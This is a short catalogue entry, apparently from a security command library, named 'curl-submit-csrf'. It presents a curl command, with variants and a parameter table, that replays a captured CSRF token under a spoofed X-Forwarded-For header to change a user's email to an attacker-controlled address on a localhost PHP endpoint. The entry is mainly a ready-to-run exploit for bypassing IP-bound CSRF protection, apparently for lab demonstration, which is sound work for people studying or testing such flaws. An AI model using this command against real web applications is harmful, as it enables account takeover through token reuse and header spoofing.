---
id: d4e5f6g7-h8i9-0123-defg-456789012345
data: >-
  TOKEN="captured_token_here"\ncurl -H "X-Forwarded-For: 10.0.0.50" -X POST
  http://localhost/update-profile.php -d
  "csrf_token=$TOKEN&action=update_email&new_email=attacker@example.com"
tags:
  - web
  - proxy
  - csrf
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:27:03.268Z'
verified: false
validated: true
submitted: true
---
# curl-submit-csrf

## Command

```bash
TOKEN="captured_token_here"
curl -H "X-Forwarded-For: 10.0.0.50" -X POST http://localhost/update-profile.php -d "csrf_token=$TOKEN&action=update_email&new_email=attacker@example.com"
```

## Description

This command submits a POST request with a reused CSRF token from a different simulated client IP, exploiting the IP-binding failure to perform an unauthorized state-changing action like email update.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "X-Forwarded-For: IP"` | Simulates different client IP | Yes |
| `-X POST` | Specifies POST method | Yes |
| `-d DATA` | Form data including token and payload | Yes |
| `URL` | Endpoint for the action | Yes |

## Examples

### Basic Usage

```bash
TOKEN="abc123"\ncurl -H "X-Forwarded-For: 10.0.0.50" -X POST http://localhost/update-profile.php -d "csrf_token=$TOKEN&new_email=attacker@example.com"
```

### Advanced Usage

```bash
TOKEN="abc123"\ncurl -H "X-Forwarded-For: 10.0.0.50" -X POST -v http://localhost/update-profile.php -d "csrf_token=$TOKEN&action=update&new_email=attacker@example.com"
```

## Expected Output

Success message (e.g., "Update successful") indicating bypass, as token validates against proxy IP.

## Related

- [[Related Procedure: Demonstrate-CSRF-IP-Binding-Failure]]
